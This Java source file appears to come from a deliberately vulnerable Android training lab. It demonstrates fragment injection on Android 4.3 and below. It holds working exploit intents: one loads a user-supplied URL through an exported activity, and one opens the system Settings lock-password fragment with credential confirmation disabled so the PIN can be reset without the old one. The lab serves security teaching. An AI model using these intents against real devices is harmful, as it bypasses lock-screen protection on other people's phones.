package com.hptsec.vulnlab.View.M7SubView;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.actionbarsherlock.app.SherlockFragment;
import com.hptsec.vulnlab.R;
import com.hptsec.vulnlab.Utilities.MyColorHandler;

/**
 * M7Case5 - Fragment Injection Vulnerable on Android 4.3 and Below
 * 
 * 
 * @author whitehatpanda
 * 
 */
public class M7Case5Fragment extends SherlockFragment {

	private static String TAG = "M7Case5 - Fragment Injection";

	private static final String ARG_POSITION = "position";

	private int position;

	public static M7Case5Fragment newInstance(int position) {
		M7Case5Fragment f = new M7Case5Fragment();
		Bundle b = new Bundle();
		b.putInt(ARG_POSITION, position);
		f.setArguments(b);
		return f;
	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		position = getArguments().getInt(ARG_POSITION);
	}

	@Override
	public View onCreateView(LayoutInflater inflater, ViewGroup container,
			Bundle savedInstanceState) {

		View view = inflater.inflate(
				R.layout.fragment_m7case5_fragmentinjection, container, false);

		final TextView txtM7C5Result = (TextView) view
				.findViewById(R.id.txtM7C5Result);

		final TextView txtM7C5VulnDescription = (TextView) view
				.findViewById(R.id.txtM7C5VulnDescription);

		final EditText editUri = (EditText) view.findViewById(R.id.editM7C5Uri);

		Button btnM7C5CallThisAppExploit = (Button) view
				.findViewById(R.id.btnM7C5CallThisAppExploit);

		Button btnM7C5CallSettingsAppExpoit = (Button) view
				.findViewById(R.id.btnM7C5CallSettingsAppExploit);

		btnM7C5CallThisAppExploit.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				String myUri = editUri.getText().toString();
				if (myUri.length() > 0) {
					try {
						Intent i = new Intent();
						i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
						i.setClassName("com.fptsec.vulnlab",
								"M7Case5VulnActivity");

						i.putExtra(":android:show_fragment",
								"M7Case5JunkFragment");
						Log.d(TAG, Uri.parse(myUri).toString());
						i.setData(Uri.parse(myUri));
						getActivity().startActivity(i);

						// Set Result, VulnDescription, Toast
						Toast.makeText(
								getActivity().getBaseContext(),
								"The implicity exported Activity will handle your request and launch targeted fragment and load extra Url.",
								Toast.LENGTH_SHORT).show();

						txtM7C5Result.setText("Exploit successful!");
						txtM7C5Result.setTextColor(MyColorHandler
								.getResultColor());

						txtM7C5VulnDescription.setText(getActivity().getString(
								R.string.m7case5_vulndescription_1));
						txtM7C5VulnDescription.setTextColor(MyColorHandler
								.getVulnDescriptionColor());
					} catch (Exception e) {
						// TODO: handle exception
						e.printStackTrace();
						Log.d(TAG, "Start Activity Failed!");
					}
				} else {
					txtM7C5Result
							.setText("Please insert the URL! We will send exploit to load provided URL!");
					txtM7C5Result.setTextColor(MyColorHandler.getResultColor());
					txtM7C5VulnDescription.setText("");
				}

			}
		});

		btnM7C5CallSettingsAppExpoit.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				boolean isKitKat = CheckForKitKatVersion();
				if (!isKitKat) {
					Toast.makeText(
							getActivity().getBaseContext(),
							"Setup your lock screen PIN, and try this exploit!",
							Toast.LENGTH_LONG).show();
					txtM7C5Result
							.setText("Change your lock screen PIN that do not need to know the old one!");
					txtM7C5Result.setTextColor(MyColorHandler.getResultColor());

					txtM7C5VulnDescription.setText(getActivity().getString(
							R.string.m7case5_vulndescription_2));
					txtM7C5VulnDescription.setTextColor(MyColorHandler
							.getVulnDescriptionColor());

					Log.d(TAG, "Start lock screen PIN privilege exploit");

					try {
						Intent intent = new Intent();
						intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
						intent.setClassName("com.android.settings",
								"com.android.settings.Settings");
						intent.putExtra(":android:show_fragment",
								"com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment");
						intent.putExtra("confirmcredentials", false);
						startActivity(intent);
					} catch (Exception e) {
						// TODO: handle exception
						e.printStackTrace();
						Log.d(TAG, "Exploit Settings Activity failed!");
						Toast.makeText(getActivity().getBaseContext(),
								"Exploit failed!", Toast.LENGTH_SHORT).show();
					}

				} else {
					// Toast, setText
					Toast.makeText(
							getActivity().getBaseContext(),
							"KitKat version may not vulnerable to this exploit if developer has exactly overrided isValidFragment method to verify that the given fragment is a valid type to be attached to this activity.",
							Toast.LENGTH_LONG).show();
					txtM7C5Result
							.setText("KitKat version may not vulnerable to this exploit!");

					txtM7C5Result.setTextColor(MyColorHandler.getResultColor());

					txtM7C5VulnDescription.setText("");
				}

			}

			private boolean CheckForKitKatVersion() {
				// TODO Auto-generated method stub
				if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
					return true;
				}
				return false;
			}
		});

		return view;
	}
}
